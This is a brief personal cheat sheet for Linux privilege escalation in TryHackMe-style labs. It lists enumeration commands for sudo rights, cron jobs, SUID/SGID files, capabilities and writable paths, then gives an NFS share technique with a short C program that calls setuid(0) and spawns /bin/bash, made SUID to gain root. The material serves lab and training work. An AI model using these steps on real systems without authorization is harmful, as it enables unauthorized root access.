Things to check

#check for sudo escalation
sudo -l

# check for running cronjobs
cat /etc/crontab

# find SUID's
find / -type f -perm -04000 -ls 2>/dev/null
or
find / -type f -perm -02000 -ls 2>/dev/null

#capabilities exploit
getcap -r / 2>/dev/null

#Path
Echo #PATH
find / -writable 2>/dev/null

#NFS
showmount -e <boxtoattack>
mkdir /tmp/something
mount -o rw <boxtoattack:/share /tmp/something

jump into folder that you just mounted
create a script using nano or subl

int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}

compiel with gcc file.c -o file -w

setuid
chmod +s file

OR just google tryhackme walkthrough <room name>
